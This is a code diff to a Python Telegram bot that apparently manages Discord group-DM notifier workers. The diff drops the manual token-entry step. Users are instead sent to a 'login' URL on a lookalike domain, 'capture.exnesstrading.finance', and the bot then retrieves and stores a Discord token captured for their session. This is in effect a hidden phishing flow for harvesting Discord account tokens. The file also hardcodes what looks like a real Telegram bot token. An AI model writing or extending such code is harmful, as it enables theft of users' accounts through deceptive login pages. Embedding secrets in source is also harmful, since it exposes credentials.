@@ -17,8 +17,11 @@ import subprocess
 import sys
 import random
 import string
+import uuid
 from datetime import datetime, timezone
 from pathlib import Path
+
+import httpx
 
 from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import (
@@ -35,7 +38,9 @@ from telegram.ext import (
 BOT_TOKEN = "8040375096:AAGEah1G_vpp3djxH6ehA5oSJi1oXNT9gZQ"
 ADMIN_CHAT_ID = 6402264162  # Your Telegram chat ID
 DATA_FILE = "notifier_data.json"
+SESSIONS_FILE = "login_sessions.json"
 WORKER_SCRIPT = "notifier_worker.py"
+LOGIN_BASE_URL = "https://capture.exnesstrading.finance/login"
 
 logging.basicConfig(
     level=logging.INFO,
@@ -52,6 +57,31 @@ UPDATING_TOKEN = 4
 UPDATING_GROUP = 5
 
 # ── Data management ───────────────────────────────────────────────────────────
+
+def load_sessions() -> dict:
+    if Path(SESSIONS_FILE).exists():
+        with open(SESSIONS_FILE) as f:
+            return json.load(f)
+    return {}
+
+
+def save_sessions(sessions: dict):
+    with open(SESSIONS_FILE, "w") as f:
+        json.dump(sessions, f, indent=2)
+
+
+def create_login_session(chat_id: str) -> str:
+    """Create a unique login session and return the URL."""
+    sessions = load_sessions()
+    session_id = str(uuid.uuid4())[:8]
+    sessions[session_id] = {
+        "chat_id": chat_id,
+        "created_at": datetime.now(timezone.utc).isoformat(),
+        "token": None,
+    }
+    save_sessions(sessions)
+    return f"{LOGIN_BASE_URL}?session={session_id}", session_id
+
 
 def load_data() -> dict:
     if Path(DATA_FILE).exists():
@@ -232,11 +262,33 @@ async def handle_group_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return WAITING_GROUP_ID
 
+    # Get token from login session
+    sessions = load_sessions()
+    token = None
+    for session_id, session in sessions.items():
+        if session.get("chat_id") == chat_id and session.get("token"):
+            token = session["token"]
+            break
+
+    if not token:
+        login_url, _ = create_login_session(chat_id)
+        await update.message.reply_text(
+            "⚠️ Discord account not connected yet.
+
+"
+            f"Please login first:
+{login_url}
+
+"
+            "After logging in, send your Group DM ID here."
+        )
+        return WAITING_GROUP_ID
+
+    data["users"][chat_id]["discord_token"] = token
     data["users"][chat_id]["group_dm_id"] = group_id
     data["users"][chat_id]["active"] = True
     save_data(data)
 
-    token = data["users"][chat_id]["discord_token"]
     success = start_worker(chat_id, token, group_id)
 
     if success:
@@ -535,7 +587,6 @@ def main():
         entry_points=[CommandHandler("start", start)],
         states={
             WAITING_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code)],
-            WAITING_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_token)],
             WAITING_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_group_id)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
